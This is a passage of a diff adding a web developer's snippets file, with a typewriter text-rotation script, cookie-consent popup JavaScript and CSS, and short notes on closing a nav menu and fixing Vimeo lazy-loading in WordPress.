+        this.txt = fullTxt.substring(0, this.txt.length - 1);
+      } else {
+        this.txt = fullTxt.substring(0, this.txt.length + 1);
+      }
+    
+      this.el.innerHTML = '<span class="wrap-text">'+this.txt+'</span>';
+    
+      var that = this;
+      var delta = 100 - Math.random() * 50;
+    
+      if (this.isDeleting) { delta /= 1; }
+    
+      if (!this.isDeleting && this.txt === fullTxt) {
+        delta = this.period;
+        this.isDeleting = true;
+      } else if (this.isDeleting && this.txt === '') {
+        this.isDeleting = false;
+        this.loopNum++;
+        delta = 1000;
+      }
+    
+      setTimeout(function() {
+        that.tick();
+      }, delta);
+    };
+    
+    var rotated = !1;
+    window.onload = function() {
+        if(!rotated){
+            console.log("rocket");
+          var elements = document.getElementsByClassName('txt-rotate');
+          for (var i=0; i<elements.length; i++) {
+            var toRotate = elements[i].getAttribute('data-rotate');
+            var period = elements[i].getAttribute('data-period');
+            if (toRotate) {
+            new TxtRotate(elements[i], JSON.parse(toRotate), period);
+            rotated = 1;
+        }
+      }      
+   }
+};
+</script>
+
+
+
+
+
+
+============================== cookie popup show / hide js========================
+
+
+if (window.localStorage) {
+  if (!localStorage.getItem("userAgreed")) {
+    document.querySelector("div#notice-cookie-block").style.display = "block";
+    document.body.classList.add("noaccept");
+  } else {
+    document.querySelector("div#notice-cookie-block").style.display = "none";
+    document.body.classList.remove("noaccept");
+  }
+}
+
+document.querySelector("button#btn-cookie-allow").addEventListener("click", function(event) {
+  event.preventDefault();
+  localStorage.setItem("userAgreed", true);
+  document.querySelector("div#notice-cookie-block").style.display = "none";
+  document.body.classList.remove("noaccept");
+});
+
+
+
+body.noaccept div#notice-cookie-block {
+    display:block;
+}
+
+
+body:not(.noaccept) div#notice-cookie-block {
+    display:none;
+}
+
+
+
+
+=======================to close menu outside click of nav=======================
+
+
+give position:fixed and width and height to :after of toggle button
+make it full size
+
+
+
+==================== to solve vimeo video error ====================
+
+
+
+Exclude images from Lazy Loading
+
+ => wp-video-shortcode
